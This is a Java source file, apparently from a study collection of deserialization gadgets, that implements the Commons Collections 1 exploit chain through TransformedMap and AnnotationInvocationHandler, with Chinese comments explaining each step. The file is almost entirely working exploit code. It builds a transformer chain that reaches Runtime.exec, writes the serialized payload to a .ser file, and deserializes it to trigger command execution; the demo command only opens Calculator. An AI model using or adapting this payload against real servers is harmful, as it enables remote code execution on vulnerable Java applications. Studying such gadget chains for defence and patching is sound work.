package com.sec.exploits.CommonsCollections;

import com.sec.annotation.Dependencies;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

/**
 * @program: Gadgets
 * @description:
 * @author: 0range
 * @create: 2021-05-12 10:13
 **/

/**
 * Gadget Chain :
 *         ObjectInputStream.readObject()
 *             AnnotationInvocationHandler.readObject()
 *                 TransformedMap$MapEntry.setValue()
 *                      TransformedMap.checkSetValue()
 *                             ChainedTransformer.transform()
 *                                 ConstantTransformer.transform()
 *                                 InvokerTransformer.transform()
 *                                     Method.invoke()
 *                                         Class.getMethod()
 *                                 InvokerTransformer.transform()
 *                                     Method.invoke()
 *                                         Runtime.getRuntime()
 *                                 InvokerTransformer.transform()
 *                                     Method.invoke()
 *                                         Runtime.exec()
 */


@Dependencies({
        "commons-collections:3.1",
        "jdk_1.7"
})
public class CommonsCollections1_TransformedMap_Exploit {
    public static void main(String[] args) throws Exception {
        //1.客户端构建攻击代码
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[]{} }),
//                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[]{} }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {Class.forName("java.lang.Runtime"), new Object[]{} }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"open /Applications/Calculator.app"})
        };
        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChain
        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        //给予map数据转化链
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        //反射机制调用AnnotationInvocationHandler类的构造函数
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        //取消构造函数修饰符限制
        ctor.setAccessible(true);
        //获取AnnotationInvocationHandler类实例
        Object instance = ctor.newInstance(Target.class, outerMap);

        //payload序列化写入文件，模拟网络传输
        ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc1_TransformedMap.ser")));
        fout.writeObject(instance);

        //2.服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc1_TransformedMap.ser")));
        //服务端反序列化，触发漏洞
        fin.readObject();
    }
}
